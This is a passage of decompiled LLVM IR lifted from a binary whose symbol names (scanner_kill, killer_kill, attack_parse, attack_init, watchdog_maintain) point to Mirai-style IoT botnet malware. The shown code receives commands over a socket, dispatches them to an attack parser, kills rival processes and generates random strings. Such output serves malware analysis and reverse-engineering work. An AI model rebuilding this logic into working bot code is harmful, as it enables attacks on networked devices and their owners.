  %v4_de8c = mul nuw i64 %v3_de8c, 3435973837
  %v7_de8c = trunc i64 %v4_de8c to i32
  store i32 %v7_de8c, i32* %ip.global-to-local, align 4
  %v3_de902 = udiv i64 %v4_de8c, 34359738368
  %v3_de944 = mul nuw nsw i64 %v3_de902, 8
  %v3_de94 = trunc i64 %v3_de944 to i32
  store i32 %v3_de94, i32* %r2.global-to-local, align 4
  %v2_de986 = mul nuw nsw i64 %v3_de902, 2
  %v2_de98 = trunc i64 %v2_de986 to i32
  %v2_de9c = add i32 %v3_de94, %v2_de98
  store i32 %v2_de9c, i32* %r3.global-to-local, align 4
  %v2_dea0 = sub i32 %v0_de84, %v2_de9c
  %v1_dea4 = add i32 %v2_dea0, 1
  %v1_dea8 = call i32 @sleep(i32 %v1_dea4)
  br label %dec_label_pc_db1c

dec_label_pc_deb0:                                ; preds = %dec_label_pc_dc68
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 %v2_de48, i32* %r2.global-to-local, align 4
  store i32 16, i32* %stack_var_-52, align 4
  %v5_dec4 = call i32 @__libc_accept(i32 %v2_dc5c, i32 %v2_debc, i32 %v2_de48, i32 16, i32 16)
  %v1_dec8 = call i32 @scanner_kill(i32 %v5_dec4)
  %v1_decc = call i32 @killer_kill(i32 %v1_dec8)
  %v2_dedc = call i32 @kill(i32 %v1_ded8, i32 9)
  store i32 ptrtoint (i32* @global_var_21f38.97 to i32), i32* %r3.global-to-local, align 4
  %v2_dee4 = load i32, i32* @global_var_21f38.97, align 4
  %v2_dee8 = icmp eq i32 %v2_dee4, 0
  br i1 %v2_dee8, label %dec_label_pc_def0, label %dec_label_pc_df90

dec_label_pc_def0:                                ; preds = %dec_label_pc_deb0, %dec_label_pc_df90
  %v1_def4 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_def8

dec_label_pc_def8:                                ; preds = %dec_label_pc_de40, %dec_label_pc_def0
  %v2_defc = call i32 @util_strlen(i8* %v1_defc)
  %sext = mul i32 %v2_defc, 16777216
  %v1_df00 = sdiv i32 %sext, 16777216
  %v7_df00 = inttoptr i32 %v1_df00 to i8*
  store i8* %v7_df00, i8** %stack_var_-42, align 4
  %v0_df04 = call i32 @util_local_addr()
  store i32 ptrtoint (i32* @global_var_24a4c.59 to i32), i32* @lr, align 4
  %v0_df0c = load i32, i32* @r4, align 4
  store i32 %v0_df0c, i32* %r2.global-to-local, align 4
  store i32 %v0_df04, i32* @global_var_24a4c.59, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_df1c = load i32, i32* @r5, align 4
  %v1_df1c = inttoptr i32 %v0_df1c to i32*
  %v2_df1c = load i32, i32* %v1_df1c, align 4
  %v4_df20 = call i32 @__libc_send(i32 %v2_df1c, i32 ptrtoint (i32* @global_var_19600.117 to i32), i32 %v0_df0c, i32 16384)
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_df2c = load i32, i32* @r5, align 4
  %v1_df2c = inttoptr i32 %v0_df2c to i32*
  %v2_df2c = load i32, i32* %v1_df2c, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_df38 = call i32 @__libc_send(i32 %v2_df2c, i32 %v2_de2c, i32 1, i32 16384)
  %v3_df3c = load i8*, i8** %stack_var_-42, align 4
  %v4_df3c = ptrtoint i8* %v3_df3c to i32
  store i32 %v4_df3c, i32* %r2.global-to-local, align 4
  %v3_df40 = icmp eq i8* %v3_df3c, null
  br i1 %v3_df40, label %dec_label_pc_db1c, label %dec_label_pc_df48

dec_label_pc_df48:                                ; preds = %dec_label_pc_def8
  %v0_df48 = load i32, i32* @r5, align 4
  %v1_df48 = inttoptr i32 %v0_df48 to i32*
  %v2_df48 = load i32, i32* %v1_df48, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_df54 = call i32 @__libc_send(i32 %v2_df48, i32 %v2_d958, i32 %v4_df3c, i32 16384)
  br label %dec_label_pc_db1c

dec_label_pc_df5c:                                ; preds = %dec_label_pc_dfcc, %dec_label_pc_dd50
  %v0_df5c = load i32, i32* @r5, align 4
  %v1_df5c = inttoptr i32 %v0_df5c to i32*
  %v2_df5c = load i32, i32* %v1_df5c, align 4
  store i32 %v2_df5c, i32* %r3.global-to-local, align 4
  %v7_df60 = icmp eq i32 %v2_df5c, 4
  br i1 %v7_df60, label %dec_label_pc_db1c, label %bb44

bb44:                                             ; preds = %dec_label_pc_df5c
  %v8_df64 = icmp eq i32 %v2_df5c, 11
  br i1 %v8_df64, label %dec_label_pc_db1c, label %dec_label_pc_df6c

dec_label_pc_df6c:                                ; preds = %dec_label_pc_dff0, %bb44, %dec_label_pc_dd84
  %v2_df6c = load i32, i32* @global_var_21dbc.107, align 4
  store i32 57208, i32* @lr, align 4
  %v1_df74 = icmp ne i32 %v2_df6c, -1
  call void @__pseudo_cond_branch(i1 %v1_df74, i32 ptrtoint (i32* @global_var_145e0.112 to i32))
  store i32 ptrtoint (i32* @global_var_21dbc.107 to i32), i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @global_var_21dbc.107, align 4
  %v1_df88 = call i32 @sleep(i32 1)
  br label %dec_label_pc_db1c

dec_label_pc_df90:                                ; preds = %dec_label_pc_deb0
  %v2_df94 = call i32 @kill(i32 %v2_dee4, i32 9)
  br label %dec_label_pc_def0

dec_label_pc_df9c:                                ; preds = %dec_label_pc_dd8c
  %v3_df9c = udiv i32 %v4_dd90, 256
  %v1_dfa0 = urem i32 %v4_dd90, 256
  store i32 %v1_dfa0, i32* %r3.global-to-local, align 4
  %v4_dfa4 = mul nuw nsw i32 %v1_dfa0, 256
  %v5_dfa4 = or i32 %v4_dfa4, %v3_df9c
  %v6_dfa4 = trunc i32 %v5_dfa4 to i16
  store i32 %v5_dfa4, i32* %r2.global-to-local, align 4
  store i32 %v2_dc48, i32* @lr, align 4
  %v7_dfb0 = inttoptr i32 %v5_dfa4 to i8*
  store i8* %v7_dfb0, i8** %stack_var_-42, align 4
  %tmp45 = icmp ult i16 %v6_dfa4, 1025
  br i1 %tmp45, label %dec_label_pc_dfcc, label %dec_label_pc_dfb8

dec_label_pc_dfb8:                                ; preds = %dec_label_pc_df9c
  %v2_dfb8 = load i32, i32* @global_var_21dbc.107, align 4
  %v1_dfbc = call i32 @__GI___libc_close(i32 %v2_dfb8)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_dfc4 = load i32, i32* @r8, align 4
  %v2_dfc4 = inttoptr i32 %v1_dfc4 to i32*
  store i32 -1, i32* %v2_dfc4, align 4
  br label %dec_label_pc_db1c

dec_label_pc_dfcc:                                ; preds = %dec_label_pc_df9c
  %v0_dfcc = load i32, i32* @r4, align 4
  %v1_dfcc = load i32, i32* @r5, align 4
  %v2_dfcc = inttoptr i32 %v1_dfcc to i32*
  store i32 %v0_dfcc, i32* %v2_dfcc, align 4
  store i32 %v2_dfd4, i32* @r4, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_dfdc = load i32, i32* @global_var_21dbc.107, align 4
  %v7_dfe4 = call i32 @__libc_recv(i32 %v2_dfdc, i32 %v2_dfd4, i32 %v5_dfa4, i32 16386)
  %v7_dfe8 = icmp eq i32 %v7_dfe4, -1
  br i1 %v7_dfe8, label %dec_label_pc_df5c, label %dec_label_pc_dff0

dec_label_pc_dff0:                                ; preds = %dec_label_pc_dfcc
  %v2_dff0 = icmp eq i32 %v7_dfe4, 0
  br i1 %v2_dff0, label %dec_label_pc_df6c, label %dec_label_pc_dff8

dec_label_pc_dff8:                                ; preds = %dec_label_pc_dff0
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v2_e004 = load i32, i32* @global_var_21dbc.107, align 4
  %v4_e008 = call i32 @__libc_recv(i32 %v2_e004, i32 %v2_de2c, i32 2, i32 16384)
  %v3_e010 = load i8*, i8** %stack_var_-42, align 4
  %v4_e010 = ptrtoint i8* %v3_e010 to i32
  %v3_e014 = udiv i32 %v4_e010, 256
  %v1_e018 = mul i32 %v4_e010, 256
  %v4_e01c = and i32 %v1_e018, 65280
  %v5_e01c = or i32 %v4_e01c, %v3_e014
  store i32 %v5_e01c, i32* %ip.global-to-local, align 4
  store i32 %v2_dc48, i32* @lr, align 4
  store i32 %v5_e01c, i32* %r2.global-to-local, align 4
  %v2_e02c = load i32, i32* @global_var_21dbc.107, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_e034 = inttoptr i32 %v5_e01c to i8*
  store i8* %v6_e034, i8** %stack_var_-42, align 4
  %v6_e038 = call i32 @__libc_recv(i32 %v2_e02c, i32 %v2_dfd4, i32 %v5_e01c, i32 16384)
  store i32 %v2_dc48, i32* %r2.global-to-local, align 4
  %v3_e040 = load i8*, i8** %stack_var_-42, align 4
  %v3_e044 = icmp eq i8* %v3_e040, null
  br i1 %v3_e044, label %dec_label_pc_db1c, label %dec_label_pc_e04c

dec_label_pc_e04c:                                ; preds = %dec_label_pc_dff8
  %v4_e040 = ptrtoint i8* %v3_e040 to i32
  %v5_e050 = call i32 @attack_parse(i32* nonnull %stack_var_-1432, i32 %v4_e040, i32 %v2_dc48)
  br label %dec_label_pc_db1c

; uselistorder directives
  uselistorder i8* %v3_e040, { 1, 0 }
  uselistorder i32 %v5_e01c, { 1, 0, 2, 3 }
  uselistorder i32 %v7_dfe4, { 1, 0 }
  uselistorder i32 %v5_dfa4, { 1, 0, 3, 2 }
  uselistorder i32 %v3_ddc0, { 1, 3, 2, 0 }
  uselistorder i32 %v4_dd90, { 1, 0, 2, 3 }
  uselistorder i32 %v4_dd78, { 1, 0 }
  uselistorder i32 %v2_dd1c, { 6, 3, 2, 0, 1, 5, 4 }
  uselistorder i32 %v2_dc5c, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-1436.1, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_dc44, { 1, 0, 2 }
  uselistorder i32 %v5_dc10, { 1, 2, 0 }
  uselistorder i32 %v2_db5c, { 2, 1, 0 }
  uselistorder i32 %v1_db4c, { 1, 2, 0 }
  uselistorder i32 %v1_db30, { 1, 2, 0 }
  uselistorder i32 %stack_var_-1436.0, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v2_de48, { 1, 0, 2, 3 }
  uselistorder i32 %v2_de2c, { 3, 0, 5, 4, 2, 1 }
  uselistorder i32 %v2_de24, { 1, 0 }
  uselistorder i32 %v2_dc48, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v2_db18, { 1, 0, 2 }
  uselistorder i32 %v2_d9bc, { 0, 12, 1, 13, 2, 11, 3, 10, 4, 5, 9, 8, 6, 14, 7, 15 }
  uselistorder i32 %v2_d9a8, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_d924, { 1, 0 }
  uselistorder i32 %v2_d8d4, { 1, 0, 2 }
  uselistorder i32* %stack_var_-64, { 1, 0, 2 }
  uselistorder i32* %stack_var_-152, { 1, 0, 2 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2 }
  uselistorder i8** %stack_var_-42, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 26, 27, 28, 30, 29, 33, 31, 32, 24, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 7, 8, 9, 5, 6, 10, 11 }
  uselistorder i32* @global_var_21f38.97, { 1, 2, 0 }
  uselistorder i8* null, { 0, 2, 1 }
  uselistorder i32 16386, { 1, 2, 0, 3 }
  uselistorder i32 ptrtoint (i8** @global_var_21f3c.110 to i32), { 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_21f3c.110 to i8*), { 0, 1, 3, 2 }
  uselistorder i32* @global_var_21db8.88, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9 }
  uselistorder i32* @global_var_21dbc.107, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32 (i32)* @watchdog_maintain, { 1, 0 }
  uselistorder i32 (i32)* @killer_init, { 1, 0 }
  uselistorder i32 (i32)* @attack_init, { 1, 0 }
  uselistorder i32 (i32, i32)* @rand_alpha_str, { 2, 1, 0 }
  uselistorder i32* @global_var_21dc0.86, { 2, 0, 3, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_d750.84 to i32), { 0, 2, 1 }
  uselistorder i32 ptrtoint (i16** @global_var_24a58.93 to i32), { 0, 1, 3, 2 }
  uselistorder i32 (i32, i32)* @bsd_signal, { 1, 0 }
  uselistorder label %dec_label_pc_def8, { 1, 0 }
  uselistorder label %dec_label_pc_def0, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_dc58, { 2, 1, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %dec_label_pc_db9c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_db8c, { 1, 0 }
  uselistorder label %dec_label_pc_db1c, { 7, 1, 8, 9, 2, 0, 10, 3, 11, 12, 4, 5, 13, 6, 14 }
  uselistorder label %dec_label_pc_d97c, { 2, 0, 1 }
}

define i32 @function_e080(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_e080:
  %v0_e080 = load i1, i1* @cpsr_c, align 1
  call void @__pseudo_cond_branch(i1 %v0_e080, i32 -22312140)
  %v0_e088 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_e088, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_e080
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_e080, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @rand_next() local_unnamed_addr {
entry:
  %v2_e09c = load i32, i32* @global_var_21f40.119, align 4
  %v2_e0a0 = load i32, i32* @global_var_21f4c.121, align 4
  %v4_e0ac = mul i32 %v2_e09c, 2048
  %v5_e0ac = xor i32 %v4_e0ac, %v2_e09c
  store i32 %v5_e0ac, i32* @r3, align 4
  %v4_e0b0 = udiv i32 %v2_e0a0, 524288
  %v5_e0b0 = xor i32 %v4_e0b0, %v2_e0a0
  %v2_e0b4 = load i32, i32* @global_var_21f44.123, align 4
  %v2_e0b8 = load i32, i32* @global_var_21f48.125, align 4
  %v2_e0bc = xor i32 %v5_e0b0, %v5_e0ac
  %v4_e0c0 = udiv i32 %v5_e0ac, 256
  %v5_e0c0 = xor i32 %v2_e0bc, %v4_e0c0
  store i32 %v2_e0b4, i32* @global_var_21f40.119, align 4
  store i32 %v2_e0b8, i32* @global_var_21f44.123, align 4
  store i32 %v2_e0a0, i32* @global_var_21f48.125, align 4
  store i32 %v5_e0c0, i32* @global_var_21f4c.121, align 4
  ret i32 %v5_e0c0

; uselistorder directives
  uselistorder i32 %v2_e0a0, { 2, 1, 0 }
  uselistorder i32 %v2_e09c, { 1, 0 }
}

define i32 @rand_init(i32 %arg1) local_unnamed_addr {
entry:
  %v2_e0f8 = call i32 @__GI_time(i32* null)
  store i32 %v2_e0f8, i32* @global_var_21f40.119, align 4
  %v1_e104 = call i32 @__getpid(i32 %v2_e0f8)
  store i32 %v1_e104, i32* @r0, align 4
  %v0_e10c = call i32 @getppid()
  %v2_e114 = xor i32 %v1_e104, %v0_e10c
  store i32 %v2_e114, i32* @global_var_21f44.123, align 4
  %v1_e11c = call i32 @clock(i32 %v2_e114)
  %v2_e120 = load i32, i32* @global_var_21f44.123, align 4
  %v2_e12c = xor i32 %v2_e120, %v1_e11c
  store i32 %v2_e12c, i32* @global_var_21f4c.121, align 4
  store i32 %v1_e11c, i32* @global_var_21f48.125, align 4
  ret i32 %v1_e11c

; uselistorder directives
  uselistorder i32 %v1_e11c, { 1, 2, 0 }
  uselistorder i32 ()* @getppid, { 1, 0 }
  uselistorder i32 (i32)* @__getpid, { 1, 0 }
}

define i32 @rand_alpha_str(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_e154 = load i32, i32* @r4, align 4
  %v6_e154 = load i32, i32* @r5, align 4
  %v9_e154 = load i32, i32* @r6, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  %v1_e168 = call i32 @table_unlock_val(i32 30)
  %v3_e174 = call i32 @table_retrieve_val(i32 30, i32* null)
  store i32 %v3_e174, i32* @r1, align 4
  %v2_e180 = bitcast i32* %stack_var_-72 to i8*
  %v3_e180 = call i32 @strcpy(i8* %v2_e180, i32 %v3_e174)
  %v2_e184 = icmp eq i32 %arg2, 0
  br i1 %v2_e184, label %dec_label_pc_e200, label %dec_label_pc_e18c

dec_label_pc_e18c:                                ; preds = %entry
  store i32 ptrtoint (i32* @global_var_21f40.119 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21f44.123 to i32), i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21f48.125 to i32), i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21f4c.121 to i32), i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v2_e1e4 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_e1a0

dec_label_pc_e1a0:                                ; preds = %dec_label_pc_e1a0.dec_label_pc_e1a0_crit_edge, %dec_label_pc_e18c
  %v1_e1c4 = phi i32 [ %v1_e1c4.pre, %dec_label_pc_e1a0.dec_label_pc_e1a0_crit_edge ], [ ptrtoint (i32* @global_var_21f40.119 to i32), %dec_label_pc_e18c ]
  %v2_e1a0 = load i32, i32* @global_var_21f4c.121, align 4
  store i32 %v2_e1a0, i32* %r2.global-to-local, align 4
  %v2_e1a4 = load i32, i32* @global_var_21f40.119, align 4
  %v4_e1a8 = udiv i32 %v2_e1a0, 524288
  %v5_e1a8 = xor i32 %v4_e1a8, %v2_e1a0
  %v4_e1ac = mul i32 %v2_e1a4, 2048
  %v5_e1ac = xor i32 %v4_e1ac, %v2_e1a4
  %v2_e1b0 = xor i32 %v5_e1a8, %v5_e1ac
  %v2_e1b4 = load i32, i32* @global_var_21f44.123, align 4
  %v2_e1b8 = load i32, i32* @global_var_21f48.125, align 4
  store i32 %v2_e1b8, i32* %ip.global-to-local, align 4
  %v4_e1bc = udiv i32 %v5_e1ac, 256
  %v5_e1bc = xor i32 %v2_e1b0, %v4_e1bc
  store i32 %v5_e1bc, i32* @r4, align 4
  %v2_e1c4 = inttoptr i32 %v1_e1c4 to i32*
  store i32 %v2_e1b4, i32* %v2_e1c4, align 4
  %v0_e1c8 = load i32, i32* %ip.global-to-local, align 4
  %v1_e1c8 = load i32, i32* %r8.global-to-local, align 4
  %v2_e1c8 = inttoptr i32 %v1_e1c8 to i32*
  store i32 %v0_e1c8, i32* %v2_e1c8, align 4
  %v0_e1cc = load i32, i32* %r2.global-to-local, align 4
  %v1_e1cc = load i32, i32* %r7.global-to-local, align 4
  %v2_e1cc = inttoptr i32 %v1_e1cc to i32*
  store i32 %v0_e1cc, i32* %v2_e1cc, align 4
  %v0_e1d0 = load i32, i32* @r4, align 4
  %v1_e1d0 = load i32, i32* @r6, align 4
  %v2_e1d0 = inttoptr i32 %v1_e1d0 to i32*
  store i32 %v0_e1d0, i32* %v2_e1d0, align 4
  %v2_e1d4 = call i32 @util_strlen(i8* %v2_e180)
  %v0_e1dc = load i32, i32* @r4, align 4
  %v3_e1e0 = urem i32 %v0_e1dc, %v2_e1d4
  %v2_e1e8 = add i32 %v3_e1e0, %v2_e1e4
  %v1_e1ec = add i32 %v2_e1e8, -32
  %v2_e1ec = inttoptr i32 %v1_e1ec to i8*
  %v3_e1ec = load i8, i8* %v2_e1ec, align 1
  %v2_e1f0 = load i32, i32* @r5, align 4
  %v3_e1f0 = load i32, i32* %fp.global-to-local, align 4
  %v4_e1f0 = add i32 %v3_e1f0, %v2_e1f0
  %v5_e1f0 = inttoptr i32 %v4_e1f0 to i8*
  store i8 %v3_e1ec, i8* %v5_e1f0, align 1
  %v0_e1f4 = load i32, i32* @r5, align 4
  %v1_e1f4 = add i32 %v0_e1f4, 1
  store i32 %v1_e1f4, i32* @r5, align 4
  %v1_e1f8 = load i32, i32* %sb.global-to-local, align 4
  %v9_e1f8 = icmp eq i32 %v1_e1f4, %v1_e1f8
  br i1 %v9_e1f8, label %dec_label_pc_e200, label %dec_label_pc_e1a0.dec_label_pc_e1a0_crit_edge

dec_label_pc_e1a0.dec_label_pc_e1a0_crit_edge:    ; preds = %dec_label_pc_e1a0
  %v1_e1c4.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_e1a0

dec_label_pc_e200:                                ; preds = %dec_label_pc_e1a0, %entry
  %v1_e204 = call i32 @table_lock_val(i32 30)
  store i32 %v3_e154, i32* @r4, align 4
  store i32 %v6_e154, i32* @r5, align 4
  store i32 %v9_e154, i32* @r6, align 4
  ret i32 %v1_e204

; uselistorder directives
  uselistorder i32 %v2_e1a4, { 1, 0 }
  uselistorder i32 %v2_e1a0, { 1, 0, 2 }
}

define i32 @rand_str(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_e224 = load i32, i32* %r1.global-to-local, align 4
  %v3_e228 = load i32, i32* @r4, align 4
  store i32 %v3_e228, i32* %stack_var_-28, align 4
  %v0_e22c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_e22c, i32* %r5.global-to-local, align 4
  %tmp16 = icmp slt i32 %v0_e224, 1
  br i1 %tmp16, label %dec_label_pc_e2d4, label %dec_label_pc_e234

dec_label_pc_e234:                                ; preds = %entry
  store i32 ptrtoint (i32* @global_var_21f4c.121 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21f48.125 to i32), i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21f44.123 to i32), i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21f40.119 to i32), i32* %r6.global-to-local, align 4
  %v2_e244 = load i32, i32* @global_var_21f4c.121, align 4
  store i32 %v2_e244, i32* %lr.global-to-local, align 4
  %v2_e248 = load i32, i32* @global_var_21f48.125, align 4
  store i32 %v2_e248, i32* %r4.global-to-local, align 4
  %v2_e24c = load i32, i32* @global_var_21f44.123, align 4
  store i32 %v2_e24c, i32* %r0.global-to-local, align 4
  %v2_e250 = load i32, i32* @global_var_21f40.119, align 4
  br label %dec_label_pc_e274

dec_label_pc_e258:                                ; preds = %dec_label_pc_e294
  %v1_e258 = trunc i32 %v5_e284 to i16
  %v3_e258 = inttoptr i32 %v9_e288 to i16*
  store i16 %v1_e258, i16* %v3_e258, align 2
  %v4_e258 = load i32, i32* %r5.global-to-local, align 4
  %v5_e258 = add i32 %v4_e258, -2
  store i32 %v5_e258, i32* %r5.global-to-local, align 4
  %v0_e25c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e25c

dec_label_pc_e25c:                                ; preds = %.thread, %dec_label_pc_e258
  %v0_e25c = phi i32 [ %v9_e28c, %.thread ], [ %v0_e25c.pre, %dec_label_pc_e258 ]
  %v2_e2585 = phi i32 [ %v12_e288, %.thread ], [ %v5_e258, %dec_label_pc_e258 ]
  %tmp17 = icmp slt i32 %v0_e25c, 1
  br i1 %tmp17, label %dec_label_pc_e2dc, label %dec_label_pc_e268

dec_label_pc_e268:                                ; preds = %dec_label_pc_e25c
  %v0_e260 = load i32, i32* %r0.global-to-local, align 4
  %v0_e268 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_e268, i32* %r0.global-to-local, align 4
  %v0_e26c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v0_e26c, i32* %r4.global-to-local, align 4
  %v0_e270 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_e270, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_e274

dec_label_pc_e274:                                ; preds = %dec_label_pc_e234, %dec_label_pc_e268
  %v0_e2c0 = phi i32 [ %v2_e24c, %dec_label_pc_e234 ], [ %v0_e268, %dec_label_pc_e268 ]
  %v9_e288 = phi i32 [ %v0_e22c, %dec_label_pc_e234 ], [ %v2_e2585, %dec_label_pc_e268 ]
  %v0_e2a0 = phi i32 [ %v0_e224, %dec_label_pc_e234 ], [ %v0_e25c, %dec_label_pc_e268 ]
  %v0_e2b4 = phi i32 [ %v2_e244, %dec_label_pc_e234 ], [ %v0_e270, %dec_label_pc_e268 ]
  %v0_e2b0 = phi i32 [ %v2_e250, %dec_label_pc_e234 ], [ %v0_e260, %dec_label_pc_e268 ]
  %v4_e274 = mul i32 %v0_e2b0, 2048
  %v5_e274 = xor i32 %v4_e274, %v0_e2b0
  %v4_e278 = udiv i32 %v0_e2b4, 524288
  %v5_e278 = xor i32 %v4_e278, %v0_e2b4
  %v2_e27c = xor i32 %v5_e278, %v5_e274
  %v4_e284 = udiv i32 %v5_e274, 256
  %v5_e284 = xor i32 %v2_e27c, %v4_e284
  store i32 %v5_e284, i32* %r3.global-to-local, align 4
  %v7_e288 = icmp sgt i32 %v0_e2a0, 3
  br i1 %v7_e288, label %.thread, label %dec_label_pc_e294

.thread:                                          ; preds = %dec_label_pc_e274
  %v10_e288 = inttoptr i32 %v9_e288 to i32*
  store i32 %v5_e284, i32* %v10_e288, align 4
  %v11_e288 = load i32, i32* %r5.global-to-local, align 4
  %v12_e288 = add i32 %v11_e288, 4
  store i32 %v12_e288, i32* %r5.global-to-local, align 4
  %v8_e28c = load i32, i32* %r1.global-to-local, align 4
  %v9_e28c = add i32 %v8_e28c, -4
  store i32 %v9_e28c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e25c

dec_label_pc_e294:                                ; preds = %dec_label_pc_e274
  %v7_e2a0 = icmp eq i32 %v0_e2a0, 1
  store i32 %v5_e284, i32* %r3.global-to-local, align 4
  %v1_e2a8 = add i32 %v0_e2a0, -2
  store i32 %v1_e2a8, i32* %r1.global-to-local, align 4
  br i1 %v7_e2a0, label %dec_label_pc_e2b0, label %dec_label_pc_e258

dec_label_pc_e2b0:                                ; preds = %dec_label_pc_e294
  store i32 %v5_e284, i32* %r3.global-to-local, align 4
  %v1_e2c0 = load i32, i32* %r6.global-to-local, align 4
  %v2_e2c0 = inttoptr i32 %v1_e2c0 to i32*
  store i32 %v0_e2c0, i32* %v2_e2c0, align 4
  %v0_e2c4 = load i32, i32* %r4.global-to-local, align 4
  %v1_e2c4 = load i32, i32* %r7.global-to-local, align 4
  %v2_e2c4 = inttoptr i32 %v1_e2c4 to i32*
  store i32 %v0_e2c4, i32* %v2_e2c4, align 4
  %v0_e2c8 = load i32, i32* %lr.global-to-local, align 4
  %v1_e2c8 = load i32, i32* %r8.global-to-local, align 4
  %v2_e2c8 = inttoptr i32 %v1_e2c8 to i32*
  store i32 %v0_e2c8, i32* %v2_e2c8, align 4
  %v0_e2cc = load i32, i32* %r3.global-to-local, align 4
  %v1_e2cc = load i32, i32* %sl.global-to-local, align 4
  %v2_e2cc = inttoptr i32 %v1_e2cc to i32*
  store i32 %v0_e2cc, i32* %v2_e2cc, align 4
  %v0_e2d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_e2d0 = trunc i32 %v0_e2d0 to i8
  %v2_e2d0 = load i32, i32* %r5.global-to-local, align 4
  %v3_e2d0 = inttoptr i32 %v2_e2d0 to i8*
  store i8 %v1_e2d0, i8* %v3_e2d0, align 1
  br label %dec_label_pc_e2d4

dec_label_pc_e2d4:                                ; preds = %entry, %dec_label_pc_e2dc, %dec_label_pc_e2b0
  %v2_e2d4 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_e2d4, i32* @r4, align 4
  %v1_e2d8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_e2d8

dec_label_pc_e2dc:                                ; preds = %dec_label_pc_e25c
  %v0_e2dc = load i32, i32* %r3.global-to-local, align 4
  %v1_e2dc = load i32, i32* %sl.global-to-local, align 4
  %v2_e2dc = inttoptr i32 %v1_e2dc to i32*
  store i32 %v0_e2dc, i32* %v2_e2dc, align 4
  %v0_e2e0 = load i32, i32* %lr.global-to-local, align 4
  %v1_e2e0 = load i32, i32* %r8.global-to-local, align 4
  %v2_e2e0 = inttoptr i32 %v1_e2e0 to i32*
  store i32 %v0_e2e0, i32* %v2_e2e0, align 4
  %v0_e2e4 = load i32, i32* %r4.global-to-local, align 4
  %v1_e2e4 = load i32, i32* %r7.global-to-local, align 4
  %v2_e2e4 = inttoptr i32 %v1_e2e4 to i32*
  store i32 %v0_e2e4, i32* %v2_e2e4, align 4
  %v0_e2e8 = load i32, i32* %r0.global-to-local, align 4
